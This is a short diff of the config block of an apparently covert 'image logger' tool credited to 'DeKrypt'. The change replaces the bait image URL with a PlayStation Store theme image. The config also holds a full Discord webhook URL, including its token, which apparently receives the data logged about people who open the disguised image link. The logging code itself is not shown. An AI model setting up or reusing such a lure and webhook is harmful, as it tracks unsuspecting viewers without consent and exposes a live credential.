@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1445699194894680135/mdpqj1EwNtDwTW1eaxOV6EYgnBOfjpxTbDnvGDmvlOS7MqpMISlj0dteWkWqFBT8yD6A",
-    "image": "https://i.pinimg.com/736x/21/9e/a9/219ea964f5573196d92620c3ac5a1471.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://store.playstation.com/store/api/chihiro/00_09_000/container/BR/en/99/UP2611-CUSA05877_00-THEMEBUNDLE00001/0/image", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
